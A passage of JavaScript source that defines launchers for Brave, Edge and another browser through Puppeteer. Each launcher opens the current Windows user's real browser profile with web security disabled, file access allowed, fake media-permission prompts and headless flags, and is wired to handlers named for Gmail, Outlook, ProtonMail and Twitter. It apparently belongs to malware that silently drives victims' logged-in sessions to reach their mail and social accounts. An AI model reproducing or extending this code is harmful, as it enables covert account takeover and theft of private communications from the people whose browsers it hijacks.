                    '--disable-web-security',
                    '--disable-notifications',
                    '--disable-images',
                    '--noerrordialogs',
                    '--mute-audio',
                    '--disable-notifications',
                    '--disable-infobars',
                    '--blink-settings=imagesEnabled=false',
                    '--disable-fetching-hints-at-navigation-start',
                    '--wm-window-animations-disabled',
                    '--disable-remote-fonts',
                    '--headless'
                ],
                userDataDir: user_path,
                headless: false,
                // ignoreDefaultArgs: true,
                // product: 'firefox',
            });  
        }
    },
    brave: { 
        gmail: gmail_chromium,
        outlook: outlook_chrome,
        proton: protonmail_chrome,
        twitter: twitter_chrome,
        spawn: () => {
            const user_path = 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data';

            return puppeteer.launch({
                executablePath: 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
                args: [ 
                    'about:blank', 
                    '--use-fake-ui-for-media-stream',
                    '--allow-file-access-from-files',
                    '--disable-web-security',
                    '--disable-notifications',
                    '--disable-images',
                    '--noerrordialogs',
                    '--mute-audio',
                    '--disable-notifications',
                    '--disable-infobars',
                    '--blink-settings=imagesEnabled=false',
                    '--disable-fetching-hints-at-navigation-start',
                    '--wm-window-animations-disabled',
                    '--disable-remote-fonts',
                    '--headless'
                ],
                userDataDir: user_path,
                headless: false,
                // ignoreDefaultArgs: true,
                // product: 'firefox',
            });
        }
    },
    edge: {
        gmail: gmail_chromium,
        outlook: outlook_chrome,
        proton: protonmail_chrome,
        twitter: twitter_chrome,
        spawn: () => {
            const user_path = 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Microsoft\\Edge\\User Data';
        
            return puppeteer.launch({
                executablePath: 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
                args: [ 
                    'about:blank', 
                    '--use-fake-ui-for-media-stream',
                    '--allow-file-access-from-files',
                    '--disable-web-security',
                    '--disable-notifications',
                    '--disable-images',
                    '--noerrordialogs',
                    '--mute-audio',
                    '--disable-notifications',
                    '--disable-infobars',
                    '--blink-settings=imagesEnabled=false',
                    '--disable-fetching-hints-at-navigation-start',
                    '--wm-window-animations-disabled',
                    '--disable-remote-fonts',
                    '--headless'
                ],
                userDataDir: user_path,
                headless: false,
                // ignoreDefaultArgs: true,
                // product: 'firefox',
            });
        }
    }
}